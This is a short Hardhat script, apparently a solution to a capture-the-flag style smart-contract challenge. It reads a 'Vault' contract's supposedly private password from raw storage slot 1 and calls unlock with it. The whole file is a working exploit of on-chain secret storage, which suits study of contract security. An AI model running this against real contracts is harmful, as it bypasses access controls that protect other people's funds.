import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xBB0C39cefb9691398816B4474bC56F093665bAF1";
const CONTRACT_NAME = "Vault";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const password = await ethers.provider.getStorageAt(contract.address, 1);

  const tx = await contract.unlock(password);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
